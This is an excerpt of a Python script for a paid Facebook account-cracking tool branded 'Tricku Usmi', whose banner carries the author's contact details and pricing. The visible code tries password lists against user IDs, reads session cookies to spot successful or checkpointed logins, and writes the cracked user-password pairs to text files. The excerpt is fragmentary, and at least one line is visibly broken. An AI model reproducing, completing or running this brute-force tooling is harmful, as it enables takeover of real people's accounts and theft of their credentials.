...
def main():
    ...
    print('\033[1;32m└────────────────────────────────────────────┘')
    print('')
    Usmi = input('\033[1;37m[+] \033[1;32mCHOOSE OPTION : ')
    if Usmi in ('1', '01'):
        __crack__().plerr()
    if Usmi in ('2', '02'):
    ...
    if Usmi in ('0', '00'):
        exit('THANKS FOR USING TRICKU USMII TOOL')  
    else:
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mUsmi-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;31m[\033[1;30mTricku-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mUsmi\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[Tricku-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('Tricku_Cp.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
...
def publiccrack():
    ...
    os.system('clear')
    print(banner)
    os.system('rm -rf .Usmi1.txt')
    os.system('rm -rf .Usmi2.txt')
    ...
    print(50*"\033[1;97m_")
    _Tricku__ = input('\033[1;37m[+] \033[1;32mCHOOSE OPTION : ')
    if _Tricku__ in ('1', '01'):
        __cracking__().plerr()
    if _Tricku__ in ('0', '00'):
...
def create_file():
    ...
    for links in range(ask_link):
        completed +=1
        li = ('1')
        os.system('cat .Usmi1.txt | grep '+li+' >> .Usmi1.txt')
    ...
    os.system('clear')
    lines = open('.Usmi1.txt', 'r').readlines()
    print(banner)
...
banner = """ 
  ...
  _____    _    _          _   _          _ 
 |_   _| _(_)__| |___  _  | | | |____ __ (_)
   | || '_| / _| / / || | | |_| (_-< '  \| |
   |_||_| |_\__|_\_\\_,_|  \___//__/_|_|_|_|
                                            

                       
\033[1;32m┌────────────────────────────────────────────────┐
\033[1;32m│\033[1;31m➣\033[1;37m AUTHOR  \033[1;31m:\033[1;32m TRICKU USMII      │\033[1;37m• \033[1;36mTHIS TOOL IS PAID \033[1;37m•\033[1;32m │
\033[1;32m│\033[1;31m➣\033[1;37m FACEBOOK\033[1;31m:\033[1;32m USMAN GULL  │\033[1;37m• \033[1;36mPER MONTH PACKAGE \033[1;37m• \033[1;32m│
\033[1;32m│\033[1;31m➣\033[1;37m WHATSAPP\033[1;31m:\033[1;32m 03132281952│\033[1;32m──────────────────────\033[1;32m│
\033[1;32m│\033[1;31m➣\033[1;37m YOUTUBE \033[1;31m:\033[1;32m Usmi tricks│\033[1;37m  • \033[1;36mPRICE \033[1;31m= \033[1;36m300RS \033[1;37m•   \033[1;32m│
\033[1;32m└────────────────────────────────────────────────┘
\033[1;32m│         \033[1;37m• 🇹​​​​​🇭​​​​​🇮​​​​​🇸​​​​​ 🇹​​​​​🇴​​​​​🇴​​​​​🇱​​​​​ 🇨​​​​​🇷​​​​​🇪​​​​​🇦​​​​​🇹​​​​​🇪​​​​​🇩​​​​​ 🇧​​​​​🇾​​​​​ MR USMAN GULL \033[1;37m•      \033[1;32m │
\033[1;32m└────────────────────────────────────────────────┘
"""
ct = datetime.now()
n = ct.month
